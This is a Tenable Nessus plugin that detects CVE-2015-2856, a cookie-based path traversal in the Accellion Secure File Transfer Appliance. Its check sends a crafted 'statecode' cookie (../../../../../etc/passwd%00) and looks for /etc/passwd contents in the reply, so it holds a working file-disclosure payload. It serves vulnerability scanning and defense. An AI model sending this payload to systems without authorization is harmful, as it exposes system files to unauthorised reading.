#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(85006);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/07/28 16:58:04 $");

  script_cve_id("CVE-2015-2856");
  script_osvdb_id(124432);

  script_name(english:"Accellion Secure File Transfer Appliance 'statecode' Cookie Remote File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by an arbitrary file disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Accellion Secure File Transfer Appliance is affected by an
arbitrary file disclosure vulnerability due to improper sanitization
of user-supplied input to the 'statecode' cookie used by the
template() function in function.inc. A remote, unauthenticated
attacker can exploit this vulnerability, via a specially crafted
request, to view arbitrary files on the remote host.");
  # https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cf5b267e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Accellion Secure File Transfer Appliance version
FTA_9_11_210 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/05/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/07/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:accellion:secure_file_transfer_appliance");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("accellion_file_transfer_appliance_detect.nbin");
  script_require_keys("installed_sw/Accellion Secure File Transfer Appliance");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Accellion Secure File Transfer Appliance";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443);

install = get_single_install(app_name:app, port:port);
install_url = build_url(port:port, qs:"/");

cookie   = 'statecode=../../../../../etc/passwd%00';
file     = '/etc/passwd';
file_pat = "root:.*:0:[01]:";

clear_cookiejar();

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : "/courier/intermediate_login.html",
  add_headers  : make_array("Cookie", cookie),
  exit_on_fail : TRUE
);

if (!egrep(pattern:file_pat, string:res[2]))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(http_last_sent_request()),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
